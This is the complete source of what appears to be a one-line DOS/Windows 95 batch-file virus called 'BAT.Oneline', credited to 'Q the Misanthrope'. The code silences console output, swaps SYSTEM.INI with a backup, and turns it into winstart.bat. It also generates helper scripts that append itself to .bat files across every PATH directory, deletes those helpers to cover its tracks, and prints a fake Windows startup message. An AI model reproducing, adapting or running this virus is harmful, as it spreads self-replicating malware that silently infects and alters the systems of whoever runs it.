@set bat=*.bat|for %%q in ("Echo off" "cls" "if exist c:\system.bak echo 
Starting Windows 95... " "ctty nul" "Rem BAT.Oneline brough to you by Q the 
Misanthrope" "copy/b c:\system.bak c:\SYSTEM.INI" "echo @if not exist 
c:\winstart.bat if exist c:\system.ini ren c:\system.ini winstart.bat>c:\r.q" 
"echo @if not exist %%1nul for %%%%q in (%%1\%%bat%%) do if not exist 
c:\system.ini %comspec% /f/ccopy %%%%q+c:\r.q %%%%q>q.bat" "echo @%comspec% 
/f/ccopy/b %%2+%%2.bat %%1>>q.bat" "echo @for %%%%q in (c:\winstart.bat 
c:\SYSTEM.BAK %%path%%) do call c:\q.bat %%%%q %%1>r.bat" "call c:\r.bat %0" 
"del c:\q.bat" "del c:\r.q" "del c:\r.bat" "set bat=" "ctty con") do %%q